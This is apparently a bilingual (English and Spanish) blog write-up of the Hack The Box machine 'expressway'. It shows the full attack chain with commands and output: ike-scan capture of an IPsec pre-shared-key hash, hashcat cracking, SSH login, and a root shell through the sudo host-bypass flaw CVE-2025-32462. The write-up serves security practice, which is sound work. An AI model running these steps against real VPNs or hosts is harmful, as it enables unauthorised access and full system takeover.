<!DOCTYPE html>
<html lang="es" data-theme="light">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>expressway | Writeup</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="../../index.css">
</head>

<body>
    <nav class="top-nav">
        <div class="container">
            <div class="nav-content">
                <div class="nav-left">
                    <a href="../../index.html" class="back-link" title="Back to home">‚Üê</a>
                    <h1 data-i18n="site-title">KDW_LABS</h1>
                </div>
                <div class="nav-controls">
                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
                        <span class="theme-icon">üåô</span>
                    </button>
                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
                        <span>EN</span>
                    </button>
                </div>
            </div>
        </div>
    </nav>

    <main class="container">
        <header class="machine-header">
            <h1 class="machine-title">expressway</h1>
            <div class="machine-meta">
                <span class="badge badge-platform">HTB</span>
                <span class="badge badge-difficulty-easy">easy</span>
            </div>
        </header>

        <article class="machine-content">
            <div id="content-en" class="lang-content">
                <div class="machine-summary">
                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
                    <p><strong>Exploitation process:</strong> The target machine initially appeared to only expose SSH on port 22, but a UDP scan revealed an IPsec IKE service running on port 500. By using <code>ike-scan</code> in aggressive mode, I was able to capture the Pre-Shared Key (PSK) hash along with the VPN username <code>ike@expressway.htb</code>.</p>
                    
                    <p>Using hashcat with mode 5400 (IKE-PSK SHA1), I successfully cracked the PSK hash to obtain the password <code>freakingrockstarontheroad</code>. This credential pair allowed SSH access as the <code>ike</code> user, providing initial foothold on the system.</p>
                    
                    <p>For privilege escalation, I discovered that the user <code>ike</code> was a member of the <code>proxy</code> group, which gave read access to Squid proxy logs. In these logs, I found references to an alternative hostname <code>offramp.expressway.htb</code>. Investigating further, I noticed an unusual SUID sudo binary in <code>/usr/local/bin/sudo</code> running version 1.9.17, which is vulnerable to CVE-2025-32462.</p>
                    
                    <p>This vulnerability allows bypassing sudoers host restrictions by specifying an alternative hostname with the <code>-h</code> flag. When checking sudo privileges with <code>sudo -l -h offramp.expressway.htb</code>, I discovered that the <code>ike</code> user had <code>NOPASSWD: ALL</code> privileges on that host. By executing <code>sudo -h offramp.expressway.htb /bin/bash</code>, I escalated to root privileges.</p>
                    
                    <p><strong>Technologies/Exploits:</strong> IPsec IKE VPN enumeration, PSK hash cracking, CVE-2025-32462 (sudo host restriction bypass), Squid proxy log analysis.</p>
                </div>
                <hr class="summary-divider">

                <h2>Initial Reconnaissance</h2>
                <p>Starting with a standard nmap scan to identify open TCP ports and services:</p>
                <p><img src="./media/image1.png" alt="Nmap scan results showing only SSH port 22 open with a recent OpenSSH version" /></p>

                <p>The initial scan only reveals port 22 running SSH with what appears to be a relatively recent version. This is unusual for a machine that should have more attack surface. Given the limited findings, I decide to expand the reconnaissance to UDP ports, which are often overlooked but can reveal additional services.</p>

                <h2>UDP Port Discovery</h2>
                <p>Since UDP scans are significantly slower than TCP scans, while the scan runs I research common services that might be found on UDP ports. The scan identifies ports 500 and 45214 as open. Port 500 immediately catches my attention as it's commonly associated with IPsec IKE (Internet Key Exchange) VPN services.</p>

                <p>According to <a href="https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp">this resource</a>, IPsec is widely recognized as the principal technology for securing communications between networks (LAN-to-LAN) and from remote users to the network gateway (remote access), serving as the backbone for enterprise VPN solutions.</p>

                <p>The service version scan completes and now reports port 45214 as closed, indicating it was likely a false positive in the initial UDP scan. This leaves port 500 as the primary target for further investigation.</p>

                <h2>IKE Service Enumeration</h2>
                <p>To gather more information about the IKE service, I use nmap's <code>ike-version</code> script:</p>
                <pre><code class="language-bash">nmap -sU -p 500 --script ike-version 10.10.11.87</code></pre>

                <p>The script output reveals some attributes:</p>
                <pre><code class="language-plaintext">PORT    STATE SERVICE
500/udp open  isakmp
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0</code></pre>

                <p>While this confirms the service is running and shows some supported features (XAUTH and Dead Peer Detection), it doesn't explicitly reveal the version or configuration details needed for exploitation.</p>

                <h3>IKE-Scan for VPN Group Discovery</h3>
                <p>I attempt to enumerate the VPN group name using <code>ike-scan</code> with multiple transformation sets:</p>
                <pre><code class="language-bash">ike-scan -A --trans=1,2,3,4,5 10.10.11.87</code></pre>

                <p>This command doesn't return the group name, but I try another approach using aggressive mode with PSK cracking enabled:</p>
                <pre><code class="language-bash">ike-scan -A --pskcrack 10.10.11.87</code></pre>

                <p>This yields much more valuable information - the Pre-Shared Key (PSK) parameters in the format required for offline cracking:</p>
                <pre><code class="language-plaintext">IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
[long hash string truncated]</code></pre>

                <p>The hash at the end (<code>fa2a34e0bac13aecd121c4ebe72c8307ffb39cdf</code>) is the target for cracking. I initially attempt to crack it using the <code>psk-crack</code> tool:</p>
                <pre><code class="language-bash">psk-crack hashfile.txt</code></pre>

                <p>However, this doesn't find a match after processing nearly 400,000 iterations. I also try hashcat with mode 100 (SHA1) against rockyou.txt without success, suggesting the hash format or approach might be incorrect.</p>

                <h2>Network Traffic Analysis</h2>
                <p>To gather additional information, I capture network traffic on the tun0 interface using Wireshark while re-running the IKE scan commands. This passive analysis reveals something interesting in one of the captured packets:</p>
                <p><img src="./media/image2.png" alt="Wireshark packet capture showing the username ike@expressway.htb in IKE negotiation" /></p>

                <p>The capture shows the username <code>ike@expressway.htb</code> being used in the IKE exchange. This is a critical piece of information - I now have a valid username for the VPN and potentially for SSH access as well.</p>

                <p>I attempt SSH brute-force against the <code>ike</code> user with hydra, but this doesn't yield results, suggesting the password isn't in common wordlists or the rate limiting is preventing the attack.</p>

                <h2>Successful PSK Hash Cracking</h2>
                <p>Re-running <code>ike-scan</code> without the <code>--trans</code> flag provides even more detailed information:</p>
                <pre><code class="language-bash">ike-scan -A 10.10.11.87</code></pre>

                <p>The output reveals comprehensive IKE configuration details:</p>
                <pre><code class="language-plaintext">10.10.11.87 Aggressive Mode Handshake returned 
  HDR=(CKY-R=7fe5c3b9766613b9) 
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) 
  KeyExchange(128 bytes) Nonce(32 bytes) 
  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) 
  VID=09002689dfd6b712 (XAUTH) 
  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) 
  Hash(20 bytes)</code></pre>

                <p>Further research reveals that hashcat has a specific mode for IKE-PSK SHA1 hashes: mode 5400. According to the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat documentation</a>, this is the correct mode for cracking IPsec IKE aggressive mode PSK hashes.</p>

                <p>Running hashcat with mode 5400 against the captured hash successfully cracks the password:</p>
                <pre><code class="language-bash">hashcat -m 5400 hash.txt rockyou.txt</code></pre>

                <p><strong>Password found:</strong> <code>freakingrockstarontheroad</code></p>

                <h2>Initial Access via SSH</h2>
                <p>With the cracked credentials <code>ike:freakingrockstarontheroad</code>, I attempt SSH authentication:</p>
                <pre><code class="language-bash">ssh ike@10.10.11.87</code></pre>

                <p>The authentication succeeds, granting initial access to the system as the <code>ike</code> user. I can now retrieve the user flag and begin internal enumeration for privilege escalation vectors.</p>

                <h2>Internal Enumeration</h2>
                <p>After gaining access, I perform standard enumeration to understand the system's configuration and identify potential privilege escalation paths.</p>

                <h3>Active Services</h3>
                <p>Checking listening services with <code>ss -tuln</code> reveals port 25 is open locally, typically indicating an SMTP mail server. This could be useful for lateral movement or information gathering.</p>

                <h3>User Group Membership</h3>
                <p>Running <code>id</code> shows that the <code>ike</code> user belongs to the <code>proxy</code> group. This is interesting as group memberships often provide access to specific files or services that might contain sensitive information.</p>

                <h3>Process Analysis</h3>
                <p>Examining running processes with <code>ps -faux</code> reveals a suspicious process running as root:</p>
                <pre><code class="language-bash">root  3768  0.0  0.0  2900  640  ?  Ss  08:27  0:00 
  /usr/sbin/in.tftpd --listen --user tftp --address :69 --secure /srv/tftp</code></pre>

                <p>A TFTP (Trivial File Transfer Protocol) service is running on port 69, serving files from <code>/srv/tftp</code>. Investigating this directory, I find a configuration file that references a <code>secret_key</code> but doesn't reveal the actual key value or any credentials in clear text or encrypted form.</p>

                <p>The service is identified by nmap as "netkit" implementation. I attempt various TFTP exploitation techniques using both the native <code>tftp</code> client and Metasploit modules, but none yield successful exploitation paths.</p>

                <h2>SUID Binary Analysis</h2>
                <p>Searching for SUID binaries reveals an unusual configuration:</p>
                <pre><code class="language-bash">find / -perm -4000 2>/dev/null</code></pre>

                <p>The output shows something strange - <code>sudo</code> appears twice with SUID permissions:</p>
                <pre><code class="language-plaintext">/usr/local/bin/sudo
/usr/bin/sudo</code></pre>

                <p>Having <code>sudo</code> in <code>/usr/local/bin</code> instead of just the standard <code>/usr/bin</code> location is highly unusual and suggests custom installation or modification. However, checking with <code>sudo -l</code> confirms that the <code>ike</code> user doesn't have any sudo privileges configured, so this finding seems initially unexploitable.</p>

                <h3>Sudo Version Check</h3>
                <p>Checking the sudo version reveals:</p>
                <pre><code class="language-bash">sudo --version</code></pre>

                <pre><code class="language-plaintext">Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17</code></pre>

                <p>Researching this version, I discover a recent vulnerability: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32462">CVE-2025-32462</a>, with a proof-of-concept available at <a href="https://www.exploit-db.com/exploits/52354">Exploit-DB</a>.</p>

                <h2>CVE-2025-32462 Analysis</h2>
                <p>The vulnerability allows bypassing host-based restrictions in sudoers configuration. The exploit documentation provides this example scenario:</p>

                <pre><code class="language-plaintext">Example /etc/sudoers file using the Host_Alias directive:

Host_Alias SERVERS = prod.test.local, dev.test.local
Host_Alias PROD = prod.test.local
lowpriv SERVERS, !PROD = NOPASSWD:ALL
lowpriv ci.test.local = NOPASSWD:ALL</code></pre>

                <p>In this configuration, even though <code>prod.test.local</code> is explicitly denied, root access can be achieved by specifying the <code>-h</code> flag with an allowed hostname like <code>dev.test.local</code> or <code>ci.test.local</code>.</p>

                <p>The key is finding alternative hostnames that might be configured in the sudoers file with more permissive rules.</p>

                <h2>Discovering Alternative Hostname</h2>
                <p>Remembering that the <code>ike</code> user is in the <code>proxy</code> group, I search for files accessible to this group:</p>
                <pre><code class="language-bash">find / -group proxy 2>/dev/null</code></pre>

                <p>This reveals access to Squid proxy logs in <code>/var/log/squid/access.log.1</code>. Examining these logs, I find an interesting entry:</p>
                <pre><code class="language-plaintext">1753229688.902 0 192.168.68.50 TCP_DENIED/403 3807 
  GET http://offramp.expressway.htb - HIER_NONE/- text/html</code></pre>

                <p>The hostname <code>offramp.expressway.htb</code> appears in the proxy logs, suggesting it's an alternative name for this system or a closely related one in the network configuration.</p>

                <h2>Privilege Escalation via Sudo Host Bypass</h2>
                <p>With the alternative hostname discovered, I test if sudo privileges differ when specifying this host:</p>
                <pre><code class="language-bash">sudo -l -h offramp.expressway.htb</code></pre>

                <p>The output reveals a critical misconfiguration:</p>
                <pre><code class="language-plaintext">Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, 
    use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL</code></pre>

                <p>The <code>ike</code> user has full root privileges when specifying the <code>offramp.expressway.htb</code> hostname! This perfectly demonstrates CVE-2025-32462 - the sudoers configuration uses host-based restrictions, but by specifying a different hostname with the <code>-h</code> flag, I can bypass these restrictions.</p>

                <h3>Gaining Root Access</h3>
                <p>Exploiting this misconfiguration is straightforward. I simply execute a root shell with the alternative hostname specified:</p>
                <pre><code class="language-bash">sudo -h offramp.expressway.htb /bin/bash</code></pre>

                <p>Verification:</p>
                <pre><code class="language-bash">whoami</code></pre>
                <pre><code class="language-plaintext">root</code></pre>

                <p>I now have root privileges and can retrieve the root flag, completing the machine:</p>
                <pre><code class="language-bash">cat /root/root.txt</code></pre>

                <p>This privilege escalation highlights the importance of careful sudoers configuration and the risks of using host-based restrictions without proper validation. The vulnerability demonstrates how logical security boundaries can be bypassed when trust decisions are based on easily-manipulated parameters like hostname specifications.</p>
            </div>

            <div id="content-es" class="lang-content" style="display:none;">
                <div class="machine-summary">
                    <h2 data-i18n="summary-title">Resumen de Explotaci√≥n</h2>
                    <p><strong>Resumen del proceso:</strong> La m√°quina objetivo aparentemente solo expon√≠a SSH en el puerto 22, pero un escaneo UDP revel√≥ un servicio IPsec IKE ejecut√°ndose en el puerto 500. Utilizando <code>ike-scan</code> en modo agresivo, pude capturar el hash de la Pre-Shared Key (PSK) junto con el nombre de usuario VPN <code>ike@expressway.htb</code>.</p>
                    
                    <p>Usando hashcat con el modo 5400 (IKE-PSK SHA1), cracke√© exitosamente el hash PSK para obtener la contrase√±a <code>freakingrockstarontheroad</code>. Este par de credenciales permiti√≥ el acceso SSH como usuario <code>ike</code>, proporcionando el punto de apoyo inicial en el sistema.</p>
                    
                    <p>Para la escalada de privilegios, descubr√≠ que el usuario <code>ike</code> era miembro del grupo <code>proxy</code>, lo que daba acceso de lectura a los logs del proxy Squid. En estos logs, encontr√© referencias a un nombre de host alternativo <code>offramp.expressway.htb</code>. Investigando m√°s a fondo, not√© un binario sudo SUID inusual en <code>/usr/local/bin/sudo</code> ejecutando la versi√≥n 1.9.17, vulnerable a CVE-2025-32462.</p>
                    
                    <p>Esta vulnerabilidad permite eludir las restricciones de host de sudoers especificando un nombre de host alternativo con el flag <code>-h</code>. Al comprobar los privilegios sudo con <code>sudo -l -h offramp.expressway.htb</code>, descubr√≠ que el usuario <code>ike</code> ten√≠a privilegios <code>NOPASSWD: ALL</code> en ese host. Ejecutando <code>sudo -h offramp.expressway.htb /bin/bash</code>, escal√© a privilegios root.</p>
                    
                    <p><strong>Tecnolog√≠as/Exploits:</strong> Enumeraci√≥n de VPN IPsec IKE, crackeo de hash PSK, CVE-2025-32462 (bypass de restricci√≥n de host en sudo), an√°lisis de logs del proxy Squid.</p>
                </div>
                <hr class="summary-divider">

                <h2>Reconocimiento Inicial</h2>
                <p>Comienzo con un escaneo est√°ndar de nmap para identificar puertos TCP abiertos y servicios:</p>
                <p><img src="./media/image1.png" alt="Resultados del escaneo de nmap mostrando solo el puerto SSH 22 abierto con una versi√≥n reciente de OpenSSH" /></p>

                <p>El escaneo inicial solo revela el puerto 22 ejecutando SSH con lo que parece ser una versi√≥n relativamente reciente. Esto es inusual para una m√°quina que deber√≠a tener m√°s superficie de ataque. Dados los hallazgos limitados, decido expandir el reconocimiento a puertos UDP, que a menudo se pasan por alto pero pueden revelar servicios adicionales.</p>

                <h2>Descubrimiento de Puertos UDP</h2>
                <p>Como los escaneos UDP son significativamente m√°s lentos que los escaneos TCP, mientras el escaneo se ejecuta investigo servicios comunes que podr√≠an encontrarse en puertos UDP. El escaneo identifica los puertos 500 y 45214 como abiertos. El puerto 500 capta inmediatamente mi atenci√≥n ya que est√° com√∫nmente asociado con servicios VPN IPsec IKE (Internet Key Exchange).</p>

                <p>Seg√∫n <a href="https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp">este recurso</a>, IPsec es ampliamente reconocido como la tecnolog√≠a principal para asegurar comunicaciones entre redes (LAN-a-LAN) y desde usuarios remotos a la puerta de enlace de la red (acceso remoto), sirviendo como la columna vertebral para soluciones VPN empresariales.</p>

                <p>El escaneo de versi√≥n de servicios se completa y ahora reporta el puerto 45214 como cerrado, indicando que probablemente fue un falso positivo en el escaneo UDP inicial. Esto deja el puerto 500 como el objetivo principal para investigaci√≥n adicional.</p>

                <h2>Enumeraci√≥n del Servicio IKE</h2>
                <p>Para recopilar m√°s informaci√≥n sobre el servicio IKE, utilizo el script <code>ike-version</code> de nmap:</p>
                <pre><code class="language-bash">nmap -sU -p 500 --script ike-version 10.10.11.87</code></pre>

                <p>La salida del script revela algunos atributos:</p>
                <pre><code class="language-plaintext">PORT    STATE SERVICE
500/udp open  isakmp
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0</code></pre>

                <p>Aunque esto confirma que el servicio est√° ejecut√°ndose y muestra algunas caracter√≠sticas soportadas (XAUTH y Dead Peer Detection), no revela expl√≠citamente la versi√≥n o detalles de configuraci√≥n necesarios para la explotaci√≥n.</p>

                <h3>IKE-Scan para Descubrimiento del Grupo VPN</h3>
                <p>Intento enumerar el nombre del grupo VPN usando <code>ike-scan</code> con m√∫ltiples conjuntos de transformaci√≥n:</p>
                <pre><code class="language-bash">ike-scan -A --trans=1,2,3,4,5 10.10.11.87</code></pre>

                <p>Este comando no devuelve el nombre del grupo, pero pruebo otro enfoque usando modo agresivo con cracking de PSK habilitado:</p>
                <pre><code class="language-bash">ike-scan -A --pskcrack 10.10.11.87</code></pre>

                <p>Esto produce informaci√≥n mucho m√°s valiosa - los par√°metros de la Pre-Shared Key (PSK) en el formato requerido para cracking offline:</p>
                <pre><code class="language-plaintext">IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
[cadena de hash larga truncada]</code></pre>

                <p>El hash al final (<code>fa2a34e0bac13aecd121c4ebe72c8307ffb39cdf</code>) es el objetivo para crackear. Inicialmente intento crackearlo usando la herramienta <code>psk-crack</code>:</p>
                <pre><code class="language-bash">psk-crack hashfile.txt</code></pre>

                <p>Sin embargo, esto no encuentra coincidencias despu√©s de procesar casi 400,000 iteraciones. Tambi√©n pruebo hashcat con el modo 100 (SHA1) contra rockyou.txt sin √©xito, sugiriendo que el formato del hash o el enfoque podr√≠an ser incorrectos.</p>

                <h2>An√°lisis de Tr√°fico de Red</h2>
                <p>Para recopilar informaci√≥n adicional, capturo tr√°fico de red en la interfaz tun0 usando Wireshark mientras vuelvo a ejecutar los comandos de escaneo IKE. Este an√°lisis pasivo revela algo interesante en uno de los paquetes capturados:</p>
                <p><img src="./media/image2.png" alt="Captura de paquetes de Wireshark mostrando el nombre de usuario ike@expressway.htb en la negociaci√≥n IKE" /></p>

                <p>La captura muestra el nombre de usuario <code>ike@expressway.htb</code> siendo usado en el intercambio IKE. Esta es una pieza cr√≠tica de informaci√≥n - ahora tengo un nombre de usuario v√°lido para la VPN y potencialmente tambi√©n para acceso SSH.</p>

                <p>Intento fuerza bruta SSH contra el usuario <code>ike</code> con hydra, pero esto no produce resultados, sugiriendo que la contrase√±a no est√° en listas comunes o que la limitaci√≥n de tasa est√° previniendo el ataque.</p>

                <h2>Crackeo Exitoso del Hash PSK</h2>
                <p>Volviendo a ejecutar <code>ike-scan</code> sin el flag <code>--trans</code> proporciona informaci√≥n a√∫n m√°s detallada:</p>
                <pre><code class="language-bash">ike-scan -A 10.10.11.87</code></pre>

                <p>La salida revela detalles completos de configuraci√≥n IKE:</p>
                <pre><code class="language-plaintext">10.10.11.87 Aggressive Mode Handshake returned 
  HDR=(CKY-R=7fe5c3b9766613b9) 
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) 
  KeyExchange(128 bytes) Nonce(32 bytes) 
  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) 
  VID=09002689dfd6b712 (XAUTH) 
  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) 
  Hash(20 bytes)</code></pre>

                <p>Investigando m√°s, descubro que hashcat tiene un modo espec√≠fico para hashes IKE-PSK SHA1: modo 5400. Seg√∫n la <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">documentaci√≥n de hashcat</a>, este es el modo correcto para crackear hashes PSK de modo agresivo IPsec IKE.</p>

                <p>Ejecutando hashcat con el modo 5400 contra el hash capturado crackea exitosamente la contrase√±a:</p>
                <pre><code class="language-bash">hashcat -m 5400 hash.txt rockyou.txt</code></pre>

                <p><strong>Contrase√±a encontrada:</strong> <code>freakingrockstarontheroad</code></p>

                <h2>Acceso Inicial v√≠a SSH</h2>
                <p>Con las credenciales crackeadas <code>ike:freakingrockstarontheroad</code>, intento autenticaci√≥n SSH:</p>
                <pre><code class="language-bash">ssh ike@10.10.11.87</code></pre>

                <p>La autenticaci√≥n tiene √©xito, otorgando acceso inicial al sistema como usuario <code>ike</code>. Ahora puedo recuperar la flag de usuario y comenzar la enumeraci√≥n interna para vectores de escalada de privilegios.</p>

                <h2>Enumeraci√≥n Interna</h2>
                <p>Tras ganar acceso, realizo enumeraci√≥n est√°ndar para entender la configuraci√≥n del sistema e identificar potenciales rutas de escalada de privilegios.</p>

                <h3>Servicios Activos</h3>
                <p>Comprobando servicios en escucha con <code>ss -tuln</code> revela que el puerto 25 est√° abierto localmente, t√≠picamente indicando un servidor de correo SMTP. Esto podr√≠a ser √∫til para movimiento lateral o recopilaci√≥n de informaci√≥n.</p>

                <h3>Membres√≠a de Grupos de Usuario</h3>
                <p>Ejecutando <code>id</code> muestra que el usuario <code>ike</code> pertenece al grupo <code>proxy</code>. Esto es interesante ya que las membres√≠as de grupo a menudo proporcionan acceso a archivos o servicios espec√≠ficos que podr√≠an contener informaci√≥n sensible.</p>

                <h3>An√°lisis de Procesos</h3>
                <p>Examinando procesos en ejecuci√≥n con <code>ps -faux</code> revela un proceso sospechoso ejecut√°ndose como root:</p>
                <pre><code class="language-bash">root  3768  0.0  0.0  2900  640  ?  Ss  08:27  0:00 
  /usr/sbin/in.tftpd --listen --user tftp --address :69 --secure /srv/tftp</code></pre>

                <p>Un servicio TFTP (Trivial File Transfer Protocol) est√° ejecut√°ndose en el puerto 69, sirviendo archivos desde <code>/srv/tftp</code>. Investigando este directorio, encuentro un archivo de configuraci√≥n que hace referencia a una <code>secret_key</code> pero no revela el valor real de la clave ni ninguna credencial en texto claro o forma cifrada.</p>

                <p>El servicio es identificado por nmap como implementaci√≥n "netkit". Intento varias t√©cnicas de explotaci√≥n TFTP usando tanto el cliente nativo <code>tftp</code> como m√≥dulos de Metasploit, pero ninguno produce rutas de explotaci√≥n exitosas.</p>

                <h2>An√°lisis de Binarios SUID</h2>
                <p>Buscando binarios SUID revela una configuraci√≥n inusual:</p>
                <pre><code class="language-bash">find / -perm -4000 2>/dev/null</code></pre>

                <p>La salida muestra algo extra√±o - <code>sudo</code> aparece dos veces con permisos SUID:</p>
                <pre><code class="language-plaintext">/usr/local/bin/sudo
/usr/bin/sudo</code></pre>

                <p>Tener <code>sudo</code> en <code>/usr/local/bin</code> en lugar de solo la ubicaci√≥n est√°ndar <code>/usr/bin</code> es altamente inusual y sugiere instalaci√≥n o modificaci√≥n personalizada. Sin embargo, comprobando con <code>sudo -l</code> confirma que el usuario <code>ike</code> no tiene ning√∫n privilegio sudo configurado, as√≠ que este hallazgo parece inicialmente no explotable.</p>

                <h3>Comprobaci√≥n de Versi√≥n de Sudo</h3>
                <p>Comprobando la versi√≥n de sudo revela:</p>
                <pre><code class="language-bash">sudo --version</code></pre>

                <pre><code class="language-plaintext">Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17</code></pre>

                <p>Investigando esta versi√≥n, descubro una vulnerabilidad reciente: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32462">CVE-2025-32462</a>, con una prueba de concepto disponible en <a href="https://www.exploit-db.com/exploits/52354">Exploit-DB</a>.</p>

                <h2>An√°lisis de CVE-2025-32462</h2>
                <p>La vulnerabilidad permite eludir restricciones basadas en host en la configuraci√≥n de sudoers. La documentaci√≥n del exploit proporciona este escenario de ejemplo:</p>

                <pre><code class="language-plaintext">Ejemplo de archivo /etc/sudoers usando la directiva Host_Alias:

Host_Alias SERVERS = prod.test.local, dev.test.local
Host_Alias PROD = prod.test.local
lowpriv SERVERS, !PROD = NOPASSWD:ALL
lowpriv ci.test.local = NOPASSWD:ALL</code></pre>

                <p>En esta configuraci√≥n, aunque <code>prod.test.local</code> est√© expl√≠citamente denegado, se puede lograr acceso root especificando el flag <code>-h</code> con un nombre de host permitido como <code>dev.test.local</code> o <code>ci.test.local</code>.</p>

                <p>La clave es encontrar nombres de host alternativos que podr√≠an estar configurados en el archivo sudoers con reglas m√°s permisivas.</p>

                <h2>Descubriendo Nombre de Host Alternativo</h2>
                <p>Recordando que el usuario <code>ike</code> est√° en el grupo <code>proxy</code>, busco archivos accesibles a este grupo:</p>
                <pre><code class="language-bash">find / -group proxy 2>/dev/null</code></pre>

                <p>Esto revela acceso a logs del proxy Squid en <code>/var/log/squid/access.log.1</code>. Examinando estos logs, encuentro una entrada interesante:</p>
                <pre><code class="language-plaintext">1753229688.902 0 192.168.68.50 TCP_DENIED/403 3807 
  GET http://offramp.expressway.htb - HIER_NONE/- text/html</code></pre>

                <p>El nombre de host <code>offramp.expressway.htb</code> aparece en los logs del proxy, sugiriendo que es un nombre alternativo para este sistema o uno estrechamente relacionado en la configuraci√≥n de red.</p>

                <h2>Escalada de Privilegios v√≠a Bypass de Host en Sudo</h2>
                <p>Con el nombre de host alternativo descubierto, pruebo si los privilegios sudo difieren al especificar este host:</p>
                <pre><code class="language-bash">sudo -l -h offramp.expressway.htb</code></pre>

                <p>La salida revela una mala configuraci√≥n cr√≠tica:</p>
                <pre><code class="language-plaintext">Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, 
    use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL</code></pre>

                <p>¬°El usuario <code>ike</code> tiene privilegios root completos al especificar el nombre de host <code>offramp.expressway.htb</code>! Esto demuestra perfectamente CVE-2025-32462 - la configuraci√≥n de sudoers usa restricciones basadas en host, pero especificando un nombre de host diferente con el flag <code>-h</code>, puedo eludir estas restricciones.</p>

                <h3>Obteniendo Acceso Root</h3>
                <p>Explotar esta mala configuraci√≥n es sencillo. Simplemente ejecuto una shell root con el nombre de host alternativo especificado:</p>
                <pre><code class="language-bash">sudo -h offramp.expressway.htb /bin/bash</code></pre>

                <p>Verificaci√≥n:</p>
                <pre><code class="language-bash">whoami</code></pre>
                <pre><code class="language-plaintext">root</code></pre>

                <p>Ahora tengo privilegios root y puedo recuperar la flag de root, completando la m√°quina:</p>
                <pre><code class="language-bash">cat /root/root.txt</code></pre>

                <p>Esta escalada de privilegios resalta la importancia de una cuidadosa configuraci√≥n de sudoers y los riesgos de usar restricciones basadas en host sin validaci√≥n apropiada. La vulnerabilidad demuestra c√≥mo los l√≠mites de seguridad l√≥gicos pueden ser eludidos cuando las decisiones de confianza se basan en par√°metros f√°cilmente manipulables como especificaciones de nombres de host.</p>
            </div>
        </article>
    </main>
    <script src="../../index.js"></script>
</body>

</html>